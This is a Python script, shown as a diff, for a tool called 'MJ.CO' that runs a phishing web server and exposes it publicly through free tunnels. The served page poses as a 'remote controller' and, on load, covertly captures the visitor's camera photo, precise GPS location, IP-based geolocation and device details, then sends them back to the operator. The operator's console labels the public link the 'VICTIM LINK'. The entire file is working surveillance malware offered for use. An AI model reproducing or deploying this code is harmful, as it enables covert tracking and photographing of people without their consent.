@@ -1,0 +1,443 @@
+#!/usr/bin/env python3
+# ============================================
+# TOOL  : MJ.CO v2.1 - MOBILE JACK CONTROL
+# AUTHOR: MANISH-VIP
+# PRICE : ₹0 (FULLY FREE)
+# NO NGROK NEEDED - AUTO TUNNEL
+# ============================================
+
+import os
+import sys
+import json
+import time
+import threading
+import socket
+import base64
+import subprocess
+import signal
+import atexit
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+from datetime import datetime
+
+# Try to import requests, but don't fail if missing
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    print("[!] requests module not installed. IP location won't work.")
+    print("[!] Install with: pip install requests")
+
+TOOL_NAME = "MJ.CO"
+AUTHOR = "MANISH-VIP"
+PREMIUM_KEY = "MANISH-VIP-99"
+VERSION = "2.1-FREE"
+
+captured_data = []
+shutdown_timer = None
+tunnel_process = None
+current_public_url = None
+
+# ========== FREE TUNNEL SYSTEM ==========
+class FreeTunnel:
+    @staticmethod
+    def start_localtunnel(port):
+        global tunnel_process, current_public_url
+        subdomain = f"mjco{int(time.time())%10000}"
+        try:
+            tunnel_process = subprocess.Popen(
+                ["npx", "localtunnel", "--port", str(port), "--subdomain", subdomain],
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                stdin=subprocess.DEVNULL, text=True
+            )
+            # Read stderr with timeout (5 sec)
+            timeout = time.time() + 5
+            while time.time() < timeout:
+                line = tunnel_process.stderr.readline()
+                if not line:
+                    break
+                if 'url' in line.lower() or 'https://' in line:
+                    for word in line.split():
+                        if word.startswith('https://'):
+                            current_public_url = word.strip()
+                            return current_public_url
+                time.sleep(0.1)
+            # Fallback
+            current_public_url = f"https://{subdomain}.loca.lt"
+            return current_public_url
+        except Exception as e:
+            print(f"[-] LocalTunnel error: {e}")
+            return None
+
+    @staticmethod
+    def start_bore(port):
+        global tunnel_process, current_public_url
+        try:
+            if os.system("which bore 2>/dev/null") != 0:
+                print("[+] Installing bore...")
+                os.system("pkg install rust -y 2>/dev/null || apt install rustc cargo -y 2>/dev/null")
+                os.system("cargo install bore-cli 2>/dev/null")
+            tunnel_process = subprocess.Popen(
+                ["bore", "local", str(port), "--to", "bore.pub"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            time.sleep(2)
+            current_public_url = f"http://bore.pub:{port}"
+            return current_public_url
+        except Exception as e:
+            print(f"[-] Bore error: {e}")
+            return None
+
+    @staticmethod
+    def start_serveo(port):
+        global tunnel_process, current_public_url
+        subdomain = f"mjco{int(time.time())%1000}"
+        try:
+            tunnel_process = subprocess.Popen(
+                ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"{subdomain}:80:localhost:{port}", "serveo.net"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            time.sleep(3)
+            current_public_url = f"https://{subdomain}.serveo.net"
+            return current_public_url
+        except Exception as e:
+            print(f"[-] Serveo error: {e}")
+            return None
+
+    @staticmethod
+    def find_best_tunnel(port):
+        print(f"[{TOOL_NAME}] 🔍 Finding best free tunnel...")
+        tunnels = [
+            ("LocalTunnel", FreeTunnel.start_localtunnel),
+            ("Serveo", FreeTunnel.start_serveo),
+            ("Bore", FreeTunnel.start_bore)
+        ]
+        for name, func in tunnels:
+            print(f"[+] Trying {name}...")
+            url = func(port)
+            if url:
+                print(f"[✅] {name} working! URL: {url}")
+                return url
+            print(f"[-] {name} failed")
+        print("[❌] All tunnels failed. Use local only.")
+        return None
+
+    @staticmethod
+    def stop():
+        global tunnel_process
+        if tunnel_process:
+            try:
+                tunnel_process.terminate()
+                tunnel_process.wait(timeout=3)
+            except:
+                tunnel_process.kill()
+            tunnel_process = None
+        os.system("pkill -f localtunnel 2>/dev/null")
+        os.system("pkill -f bore 2>/dev/null")
+        os.system("pkill -f serveo 2>/dev/null")
+
+# ========== WEB SERVER ==========
+class MJCOHandler(BaseHTTPRequestHandler):
+    def log_message(self, *a): pass
+
+    def get_client_ip(self):
+        if 'X-Forwarded-For' in self.headers:
+            return self.headers['X-Forwarded-For'].split(',')[0].strip()
+        return self.client_address[0]
+
+    def capture_info(self):
+        ip = self.get_client_ip()
+        ua = self.headers.get('User-Agent', 'N/A')
+        info = {
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'ip': ip, 'user_agent': ua
+        }
+        print(f"[👤] New visitor: {ip}")
+        if REQUESTS_AVAILABLE:
+            try:
+                r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+                if r.status_code == 200:
+                    d = r.json()
+                    if d.get('status') == 'success':
+                        info['location'] = {
+                            'city': d.get('city'), 'country': d.get('country'),
+                            'lat': d.get('lat'), 'lon': d.get('lon'),
+                            'isp': d.get('isp'),
+                            'maps': f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}"
+                        }
+                        print(f"[📍] {d.get('city')}, {d.get('country')}")
+            except: pass
+        captured_data.append(info)
+        self.save_data()
+        return info
+
+    def save_data(self):
+        fn = f"mjco_data_{datetime.now().strftime('%Y%m%d')}.json"
+        with open(fn, 'w') as f:
+            json.dump(captured_data, f, indent=2, default=str)
+
+    def do_GET(self):
+        p = urlparse(self.path)
+        path = p.path
+        params = parse_qs(p.query)
+        if path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            v = self.capture_info()
+            ip = self.get_client_ip()
+            loc = v.get('location', {})
+            html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>{TOOL_NAME} - FREE Remote Controller</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        *{{margin:0;padding:0;box-sizing:border-box;}}
+        body{{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;}}
+        .container{{max-width:420px;width:90%;background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;padding:30px;border:1px solid rgba(255,255,255,0.1);box-shadow:0 8px 32px rgba(0,0,0,0.3);}}
+        .header{{text-align:center;margin-bottom:25px;}}
+        .header h1{{font-size:28px;background:linear-gradient(90deg,#00f260,#0575e6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
+        .header .sub{{color:#888;font-size:14px;margin-top:5px;}}
+        .badge{{display:inline-block;background:#00f260;color:#000;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:bold;}}
+        .info-card{{background:rgba(0,0,0,0.3);border-radius:12px;padding:15px;margin-bottom:15px;font-size:13px;color:#aaa;}}
+        .info-card .label{{color:#666;}}
+        .info-card .value{{color:#00f260;}}
+        .input-group{{margin:20px 0;}}
+        .input-group input{{width:100%;padding:15px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:10px;color:#fff;font-size:18px;text-align:center;outline:none;}}
+        .input-group input:focus{{border-color:#00f260;}}
+        .btn{{width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;margin:8px 0;transition:all 0.3s;}}
+        .btn-danger{{background:linear-gradient(90deg,#f12711,#f5af19);color:#fff;}}
+        .btn-danger:hover{{transform:scale(1.02);box-shadow:0 5px 20px rgba(241,39,17,0.4);}}
+        .btn-cancel{{background:rgba(255,255,255,0.1);color:#fff;border:1px solid rgba(255,255,255,0.2);}}
+        .status{{text-align:center;margin-top:20px;padding:12px;border-radius:10px;font-size:14px;display:none;}}
+        .status.success{{display:block;background:rgba(0,242,96,0.2);border:1px solid #00f260;color:#00f260;}}
+        .camera-box{{margin:15px 0;text-align:center;display:none;}}
+        .camera-box video{{width:100%;border-radius:10px;border:2px solid rgba(255,255,255,0.1);}}
+        .footer{{text-align:center;margin-top:20px;font-size:11px;color:#444;}}
+        .free-tag{{background:linear-gradient(90deg,#f5af19,#f12711);padding:2px 8px;border-radius:4px;font-size:10px;color:#fff;}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>{TOOL_NAME}</h1>
+            <div class="sub"><span class="badge">FREE EDITION</span> Remote Controller v{VERSION}</div>
+        </div>
+        <div class="info-card">
+            <div>🌐 <span class="label">IP:</span> <span class="value">{ip}</span></div>
+            <div>📍 <span class="label">Location:</span> <span class="value">{loc.get('city','Detecting...')}, {loc.get('country','')}</span></div>
+            <div>📱 <span class="label">Device:</span> <span class="value">{v.get('user_agent','')[:50]}...</span></div>
+        </div>
+        <div class="input-group">
+            <label style="color:#888;font-size:13px;display:block;margin-bottom:8px;">⏰ Shutdown in:</label>
+            <input type="number" id="minutes" value="5" min="1" max="60">
+        </div>
+        <p style="font-size:12px;color:#888;text-align:center;margin:10px 0;">📸 Camera access zaroori hai verification ke liye</p>
+        <div class="camera-box" id="cameraBox">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            <p id="photoStatus" style="margin-top:8px;color:#888;font-size:12px;">📸 Capturing photo...</p>
+        </div>
+        <button class="btn btn-danger" onclick="startShutdown()">🔴 Confirm & Shutdown</button>
+        <button class="btn btn-cancel" onclick="cancelShutdown()">❌ Cancel</button>
+        <div class="status" id="status"></div>
+        <div class="footer">{TOOL_NAME} by {AUTHOR} | <span class="free-tag">100% FREE</span></div>
+    </div>
+    <script>
+        let stream=null, photoDone=false;
+        async function startCam(){{
+            try{{
+                stream=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
+                document.getElementById('video').srcObject=stream;
+                document.getElementById('cameraBox').style.display='block';
+                setTimeout(capturePhoto,1000);
+            }}catch(e){{document.getElementById('photoStatus').textContent='⚠️ Camera blocked';}}
+        }}
+        function capturePhoto(){{
+            if(photoDone)return; photoDone=true;
+            const v=document.getElementById('video'),c=document.getElementById('canvas'),ctx=c.getContext('2d');
+            c.width=v.videoWidth||640; c.height=v.videoHeight||480;
+            ctx.drawImage(v,0,0);
+            const img=c.toDataURL('image/jpeg',0.7);
+            document.getElementById('photoStatus').textContent='✅ Photo captured';
+            fetch('/capture_photo',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{photo:img,timestamp:new Date().toISOString()}})}});
+            if(stream)stream.getTracks().forEach(t=>t.stop());
+        }}
+        function captureLoc(){{
+            if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{{
+                fetch('/capture_location',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{lat:p.coords.latitude,lon:p.coords.longitude}})}});
+            }},null,{{enableHighAccuracy:true,timeout:5000}});
+        }}
+        function startShutdown(){{
+            const m=document.getElementById('minutes').value,s=document.getElementById('status');
+            s.className='status'; s.textContent='⏳ Processing...'; s.style.display='block';
+            captureLoc();
+            fetch('/shutdown?minutes='+m).then(r=>r.text()).then(d=>{{s.className='status success';s.textContent='✅ '+d;}});
+        }}
+        function cancelShutdown(){{
+            fetch('/cancel').then(r=>r.text()).then(d=>{{document.getElementById('status').className='status success';document.getElementById('status').textContent='❌ '+d;document.getElementById('status').style.display='block';}});
+        }}
+        window.addEventListener('load',()=>{{setTimeout(startCam,500);setTimeout(captureLoc,1500);}});
+        document.addEventListener('click',()=>{{if(!photoDone)startCam();}});
+    </script>
+</body>
+</html>"""
+            self.wfile.write(html.encode())
+        elif path == "/shutdown":
+            self.capture_info()
+            mins = params.get('minutes', [5])[0]
+            self.send_response(200)
+            self.send_header("Content-type", "text/plain; charset=utf-8")
+            self.end_headers()
+            start_shutdown(int(mins))
+            self.wfile.write(f"Shutdown in {mins} min ✅".encode())
+        elif path == "/cancel":
+            self.capture_info()
+            cancel_shutdown()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write("Shutdown cancelled ❌".encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"404")
+
+    def do_POST(self):
+        l = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(l)
+        p = urlparse(self.path).path
+        if p == "/capture_photo":
+            try:
+                d = json.loads(body.decode())
+                if d.get('photo'):
+                    img = base64.b64decode(d['photo'].split(',')[1])
+                    fn = f"mjco_photo_{datetime.now().strftime('%H%M%S')}.jpg"
+                    with open(fn, 'wb') as f: f.write(img)
+                    captured_data.append({'type':'photo','file':fn,'ip':self.get_client_ip()})
+                    self.save_data()
+                    print(f"[📸] Photo saved: {fn}")
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok":True}).encode())
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"error":str(e)}).encode())
+        elif p == "/capture_location":
+            try:
+                d = json.loads(body.decode())
+                info = {'type':'gps','lat':d.get('lat'),'lon':d.get('lon'),'ip':self.get_client_ip(),
+                        'maps':f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}"}
+                captured_data.append(info)
+                self.save_data()
+                print(f"[📍] GPS: {d.get('lat')},{d.get('lon')}")
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok":True}).encode())
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"error":str(e)}).encode())
+
+# ========== SHUTDOWN ==========
+def start_shutdown(mins):
+    global shutdown_timer
+    cancel_shutdown()
+    def do_shutdown():
+        print(f"\n[🔴] SHUTDOWN!")
+        if 'TERMUX_VERSION' in os.environ:
+            os.system("am broadcast -a android.intent.action.ACTION_SHUTDOWN 2>/dev/null")
+            os.system("su -c 'reboot -p' 2>/dev/null")
+            os.system("svc power shutdown 2>/dev/null")
+        else:
+            os.system("shutdown -h now 2>/dev/null")
+    shutdown_timer = threading.Timer(mins*60, do_shutdown)
+    shutdown_timer.daemon = True
+    shutdown_timer.start()
+    print(f"[✅] Shutdown in {mins} min")
+
+def cancel_shutdown():
+    global shutdown_timer
+    if shutdown_timer and shutdown_timer.is_alive():
+        shutdown_timer.cancel()
+        shutdown_timer = None
+        print("[❌] Cancelled")
+
+def get_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]; s.close(); return ip
+    except: return "127.0.0.1"
+
+def cleanup():
+    print(f"\n[{TOOL_NAME}] Cleaning...")
+    FreeTunnel.stop()
+    cancel_shutdown()
+    if captured_data:
+        print(f"\n{'='*40}")
+        print(f"[📊] TOTAL CAPTURES: {len(captured_data)}")
+        for i in captured_data:
+            if i.get('type')=='photo': print(f"  📸 {i.get('file')}")
+            elif i.get('type')=='gps': print(f"  📍 {i.get('lat')},{i.get('lon')} - {i.get('maps')}")
+            else: print(f"  👤 {i.get('ip')} - {i.get('location',{}).get('city','N/A')}")
+        print(f"{'='*40}")
+
+atexit.register(cleanup)
+signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
+
+# ========== MAIN ==========
+def main():
+    print(f"""
+    ╔{'═'*50}╗
+    ║     {TOOL_NAME} v{VERSION} - 100% FREE                ║
+    ║     👤  Author: {AUTHOR}                           ║
+    ║     🔐  Premium Key Required                       ║
+    ╚{'═'*50}╝
+    """)
+    print(f"[{TOOL_NAME}] This tool is locked. Only authorized users can run it.\n")
+    for attempt in range(3, 0, -1):
+        key = input(f"Enter Premium Key: ").strip()
+        if key == PREMIUM_KEY:
+            print(f"[✅] Access granted! Welcome {AUTHOR}.\n")
+            break
+        else:
+            print(f"[❌] Invalid key! {attempt-1} attempts left.\n")
+            if attempt == 1:
+                sys.exit(1)
+    # Termux setup
+    if 'TERMUX_VERSION' in os.environ:
+        os.system("pkg install nodejs -y 2>/dev/null")
+        os.system("termux-setup-storage 2>/dev/null")
+    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
+    use_tunnel = input(f"[{TOOL_NAME}] 🌐 Internet ke liye free tunnel? (y/N): ").strip().lower()
+    public_url = None
+    if use_tunnel == 'y':
+        print(f"[{TOOL_NAME}] 🔄 Finding free tunnel...")
+        public_url = FreeTunnel.find_best_tunnel(port)
+    server = HTTPServer(("0.0.0.0", port), MJCOHandler)
+    local_ip = get_ip()
+    print(f"""
+    ╔{'═'*50}╗
+    ║  🌐 {TOOL_NAME} v{VERSION} - SERVER ACTIVE         ║
+    ╠{'═'*50}╣
+    ║  📍 LOCAL:    http://127.0.0.1:{port}               ║
+    ║  🌍 NETWORK:  http://{local_ip}:{port}               ║""")
+    if public_url:
+        print(f"""    ║  🌐 PUBLIC:   {public_url}    ║
+    ║  📱 VICTIM LINK: {public_url}    ║""")
+    print(f"""    ║  [CTRL+C] Stop                               ║
+    ╚{'═'*50}╝
+    """)
+    print(f"[{TOOL_NAME}] 🎯 Waiting for victims...\n")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print(f"\n[{TOOL_NAME}] Stopping...")
+        server.shutdown()
+
+if __name__ == "__main__":
+    main() 
